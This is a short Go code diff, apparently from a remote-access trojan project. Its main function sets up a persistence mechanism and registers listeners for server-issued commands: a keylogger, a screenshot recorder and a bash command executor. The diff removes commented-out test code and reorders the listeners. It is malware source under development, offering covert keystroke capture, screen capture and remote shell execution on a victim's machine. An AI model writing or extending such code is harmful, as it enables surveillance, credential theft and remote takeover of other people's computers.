@@ -14,26 +14,14 @@ func main() {
 	// folder strcuture & persist mechanism
 	deploy.Deploy()
 
-	// TODO: delete this
-	// ch := make(chan *screen.Screenshot)
-	// recorder := screen.NewScreenRecorder(5)
-	// recorder.StartCapturing(ch)
-
-	// for {
-	// 	shot := <-ch
-	// 	log.Println("Shot received: ", shot.FileName)
-	// 	log.Printf("Shot name: (%s) %s\n", shot.FileGroup, shot.FileName)
-	// 	log.Println("Shot path:", shot.FilePath)
-	// }
-
-	// TODO: delete this
-	// Observer for processing incoming
+	// Initialize Observer for processing incoming
 	// commands from server
 	screenrecorder := screen.NewScreenRecorder(5)
+
 	subject := &observer.Subject{}
+	subject.AddListener(observer.NewBashExecutorObserver())
 	subject.AddListener(observer.NewKeyloggerCmdObserver())
 	subject.AddListener(observer.NewScreenshotCmdObserver(screenrecorder))
-	subject.AddListener(observer.NewBashExecutorObserver())
 
 	// Start connection and communication with server
 	// Subject with Observers is passed as parameter
